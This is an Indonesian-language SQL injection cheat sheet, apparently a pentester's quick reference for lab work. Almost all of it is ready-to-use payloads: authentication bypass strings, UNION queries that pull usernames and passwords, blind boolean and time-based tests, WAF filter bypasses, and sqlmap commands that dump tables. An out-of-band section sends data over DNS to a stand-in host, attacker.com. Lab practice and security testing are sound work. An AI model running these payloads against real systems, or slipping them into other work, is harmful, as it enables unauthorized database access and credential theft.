# 📜 Codex: SQL Injection

*Quick reference untuk saat di tengah lab dan butuh payload cepat.*

---

## 🔍 Detection Payloads

```sql
'                   -- single quote — paling basic
''                  -- escaped quote
`                   -- backtick (MySQL)
')                  -- close paren
"))                 -- double paren + double quote
\                   -- backslash escape
```

---

## 💬 Comment Syntax

| Database | Comment |
|---|---|
| MySQL | `--` atau `#` |
| MSSQL | `--` |
| Oracle | `--` |
| PostgreSQL | `--` |

---

## 🔓 Authentication Bypass

```sql
' OR '1'='1
' OR 1=1--
' OR 'a'='a
admin'--
' OR ''='
1' OR '1'='1'--
```

---

## 🔗 UNION Attacks

```sql
-- Step 1: Cari jumlah kolom
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--    -- error di sini = 2 kolom

-- Alternatif
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--

-- Step 2: Cari kolom yang menerima string
' UNION SELECT 'a',NULL--
' UNION SELECT NULL,'a'--

-- Step 3: Extract data
' UNION SELECT username, password FROM users--
```

---

## 🗃️ Database Fingerprinting

```sql
-- MySQL
SELECT @@version
SELECT version()

-- MSSQL
SELECT @@version

-- Oracle
SELECT * FROM v$version
SELECT banner FROM v$version WHERE rownum=1

-- PostgreSQL
SELECT version()
```

---

## 📋 List Tables

```sql
-- Non-Oracle (information_schema)
SELECT table_name FROM information_schema.tables
SELECT table_name FROM information_schema.tables WHERE table_schema='public'

-- Oracle
SELECT table_name FROM all_tables
SELECT owner, table_name FROM all_tables

-- MySQL (juga bisa pakai information_schema)
SHOW TABLES
```

---

## 📋 List Columns

```sql
-- Non-Oracle
SELECT column_name FROM information_schema.columns WHERE table_name='users'

-- Oracle
SELECT column_name FROM all_tab_columns WHERE table_name='USERS'
```

---

## 👁️ Blind — Boolean

```sql
' AND 1=1--    -- true
' AND 1=2--    -- false

-- Extract data character by character
' AND SUBSTRING(username,1,1)='a'--
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--
```

---

## ⏱️ Blind — Time Based

```sql
-- MySQL
' AND SLEEP(5)--
'; SELECT SLEEP(5)--

-- MSSQL
'; WAITFOR DELAY '0:0:5'--

-- PostgreSQL
'; SELECT pg_sleep(5)--

-- Oracle
'; execute immediate 'begin dbms_pipe.receive_message(''a'',5); end;'--
```

---

## 🌐 Out-of-Band (DNS)

```sql
-- MSSQL
'; exec master..xp_dirtree '//attacker.com/a'--

-- MySQL (butuh FILE privilege)
' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT version()),'.attacker.com\\x'))--

-- Oracle
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/"> %xxe;]>'),'/') FROM dual--
```

---

## 🛡️ Filter Bypass

```sql
-- Spasi
/**/
%09 (tab)
%0a (newline)

-- Keyword bypass
SeLeCt
sElEcT
/*!SELECT*/     -- MySQL comment bypass
EXEC/**/xp_cmdshell  -- MSSQL

-- Quote bypass
CHAR(65)        -- 'A' tanpa single quote (MySQL)
CHR(65)         -- Oracle
0x61646d696e    -- hex encoding

-- XML encoding (untuk filter WAF)
&#39;           -- '
&#x27;          -- '
```

---

## 🔧 Tools

```bash
# sqlmap basic scan
sqlmap -u "https://target.com/page?id=1"

# sqlmap dengan cookie
sqlmap -u "https://target.com/page" --cookie="session=xxx"

# sqlmap dump table
sqlmap -u "https://target.com/page?id=1" -T users --dump

# sqlmap bypass WAF
sqlmap -u "https://target.com/page?id=1" --tamper=space2comment

# sqlmap level + risk (lebih agresif)
sqlmap -u "https://target.com/page?id=1" --level=3 --risk=2
```

---

## 📁 Related

- [SQLi Monster](../monsters/web/sqli/intro.md)
- [SQLi Labs Writeups](../hunts/portswigger/sqli/)
- [arsenal/scanners/sqli_scanner.py](../arsenal/scanners/sqli_scanner.py)
